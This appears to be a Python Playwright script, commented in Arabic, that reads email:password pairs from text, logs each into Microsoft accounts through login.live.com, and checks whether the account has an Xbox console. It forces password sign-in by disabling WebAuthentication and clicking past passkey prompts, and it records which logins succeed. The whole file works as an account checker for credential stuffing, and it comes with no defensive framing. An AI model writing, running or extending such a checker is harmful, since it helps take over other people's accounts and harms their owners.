import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 60000

# ------------------------------------------------------------
# دالة تجاوز شاشة Passkey (الضغط على Enter/Space + Sign in another way)
# ------------------------------------------------------------
async def bypass_passkey_screen(page):
    """تجاوز شاشة Passkey بالضغط على Enter/Space ثم اختيار Sign in another way"""
    print("🔄 محاولة تجاوز شاشة Passkey...")
    # الضغط على Enter و Space و Escape عدة مرات
    for key in ["Enter", "Space", "Enter", "Escape", "Space", "Enter"]:
        await page.keyboard.press(key)
        await asyncio.sleep(0.5)
    
    await asyncio.sleep(2)
    
    # البحث عن "Sign in another way" والنقر عليه
    try:
        if await page.locator("button:has-text('Sign in another way')").count() > 0:
            await page.click("button:has-text('Sign in another way')")
            print("✅ تم النقر على 'Sign in another way' (زر)")
            await page.wait_for_load_state("networkidle")
            await asyncio.sleep(2)
        elif await page.locator("a:has-text('Sign in another way')").count() > 0:
            await page.click("a:has-text('Sign in another way')")
            print("✅ تم النقر على 'Sign in another way' (رابط)")
            await page.wait_for_load_state("networkidle")
            await asyncio.sleep(2)
        elif await page.locator("div:has-text('Sign in another way')").count() > 0:
            await page.click("div:has-text('Sign in another way')")
            print("✅ تم النقر على 'Sign in another way' (div)")
            await page.wait_for_load_state("networkidle")
            await asyncio.sleep(2)
    except Exception as e:
        print(f"⚠️ لم يتم العثور على 'Sign in another way': {e}")
    
    # البحث عن "Use your password" أو "Use a password"
    try:
        for selector in [
            "button:has-text('Use your password')",
            "button:has-text('Use a password')",
            "button:has-text('Use password')"
        ]:
            if await page.locator(selector).count() > 0:
                await page.click(selector)
                print(f"✅ تم النقر على '{selector}'")
                await page.wait_for_load_state("networkidle")
                await asyncio.sleep(2)
                break
    except Exception as e:
        print(f"⚠️ لم يتم العثور على 'Use your password': {e}")

# ------------------------------------------------------------
# التحقق من وجود جهاز Xbox
# ------------------------------------------------------------
async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    console_url = "https://www.xbox.com/en-US/play/consoles"
    for attempt in range(3):
        try:
            await page.goto(console_url, timeout=60000)
            await page.wait_for_load_state("networkidle", timeout=60000)
            await asyncio.sleep(2)
            text = (await page.inner_text('body')).lower()
            if "play your console remotely" in text:
                return True, "يوجد جهاز Xbox", True
            if "set up your console" in text:
                return False, "تم تسجيل الدخول ولا يوجد جهاز", True
            if "sign in to finish setting up" in text:
                return False, "تسجيل الدخول غير مكتمل", False
        except:
            continue
    return False, "فشل في التحقق", False

# ------------------------------------------------------------
# معالجة إدخال كلمة المرور مع تجاوز Passkey
# ------------------------------------------------------------
async def handle_password_entry(page, account_email: str, password: str) -> bool:
    try:
        # أولاً: تجاوز أي شاشة Passkey عالقة
        await bypass_passkey_screen(page)
        
        # انتظار حقل كلمة المرور أو أي عنصر بديل
        await page.wait_for_selector(
            "input[type='password'], input[name='passwd'], button:has-text('Sign in another way')",
            timeout=15000
        )
        
        # محاولة إدخال كلمة المرور مباشرة
        if await page.locator("input[type='password'], input[name='passwd']").count() > 0:
            await page.fill("input[type='password'], input[name='passwd']", password)
            await asyncio.sleep(5)
            return True
        
        # إذا لم يظهر حقل كلمة المرور، نعيد المحاولة مرة أخرى مع الضغط على Enter
        await bypass_passkey_screen(page)
        await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=10000)
        await page.fill("input[type='password'], input[name='passwd']", password)
        await asyncio.sleep(5)
        return True
        
    except Exception as e:
        print(f"خطأ في handle_password_entry: {e}")
        return False

# ------------------------------------------------------------
# فحص حساب واحد
# ------------------------------------------------------------
async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-features=WebAuthentication',  # منع Passkey
                '--disable-web-security'
            ]
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = await context.new_page()

        # رابط يفرض كلمة المرور (لتجنب طرق المصادقة البديلة)
        login_url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&rver=7.0.0000.0&wp=MBI_SSL&wreply=https:%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles&id=292540&prompt=login"
        await page.goto(login_url, timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")

        # إدخال البريد الإلكتروني
        await page.fill("input[name='loginfmt']", account['email'])
        await asyncio.sleep(7)  # انتظار 7 ثوانٍ كما تطلب

        # الضغط على Next
        await page.click("input[type='submit']")
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(2)

        # معالجة كلمة المرور (بما فيها تجاوز Passkey)
        if not await handle_password_entry(page, account['email'], account['password']):
            raise Exception("فشل في إدخال كلمة المرور بعد المحاولات")

        # الضغط على زر تسجيل الدخول
        await page.click("input[type='submit']")
        await page.wait_for_load_state("networkidle")

        # تجاوز شاشة "البقاء مسجلاً"
        try:
            if await page.locator("input[value='Yes']").count() > 0:
                await page.click("input[value='Yes']")
        except:
            pass

        # فحص وجود جهاز Xbox
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info

        await browser.close()
        await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:100]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
